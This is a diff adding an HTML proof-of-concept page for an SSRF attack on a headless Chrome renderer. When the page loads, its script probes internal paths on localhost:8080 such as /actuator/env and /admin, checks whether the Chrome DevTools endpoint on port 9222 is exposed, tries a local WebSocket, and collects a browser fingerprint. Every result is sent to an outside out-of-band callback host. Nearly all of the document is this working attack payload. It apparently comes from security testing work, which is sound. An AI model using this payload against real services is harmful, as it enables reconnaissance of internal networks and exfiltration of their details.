@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SSRF + Headless Chrome Escalation PoC</title>
+</head>
+<body>
+  <h1>SSRF + Headless Chrome Exploitation</h1>
+  <p>Probing localhost services & DevTools access...</p>
+
+<script>
+(function() {
+  const exfil = (label, data) => {
+    fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/' + label + '?d=' + encodeURIComponent(data));
+  };
+
+  const localhostTargets = [
+    '/',
+    '/admin',
+    '/actuator/env',
+    '/actuator/health',
+    '/metrics',
+    '/api/users',
+    '/debug',
+    '/login',
+    '/version'
+  ];
+
+  // === [1] Probe localhost:8080 ===
+  localhostTargets.forEach(path => {
+    let img = new Image();
+    img.src = 'http://127.0.0.1:8080' + path;
+    img.onload = () => exfil('localhost_8080_alive', path);
+    img.onerror = () => exfil('localhost_8080_dead', path);
+  });
+
+  // === [2] Probe Chrome DevTools JSON endpoint ===
+  const devtoolsImg = new Image();
+  devtoolsImg.src = 'http://localhost:9222/json';
+  devtoolsImg.onload = () => exfil('devtools_open', '9222/json responded');
+  devtoolsImg.onerror = () => exfil('devtools_closed', '9222/json error');
+
+  // === [3] Try WebSocket to localhost:8080 ===
+  try {
+    const ws = new WebSocket('ws://localhost:8080');
+    ws.onopen = () => exfil('ws_open', 'WebSocket open on 8080');
+    ws.onerror = () => exfil('ws_error', 'WebSocket error on 8080');
+  } catch (e) {
+    exfil('ws_fail', e.toString());
+  }
+
+  // === [4] Fingerprint again for context ===
+  exfil('fingerprint', JSON.stringify({
+    ua: navigator.userAgent,
+    webdriver: navigator.webdriver,
+    plugins: navigator.plugins.length,
+    languages: navigator.languages,
+    screen: { w: screen.width, h: screen.height },
+    platform: navigator.platform,
+    doNotTrack: navigator.doNotTrack,
+    vendor: navigator.vendor
+  }));
+})();
+</script>
+
+</body>
+</html>
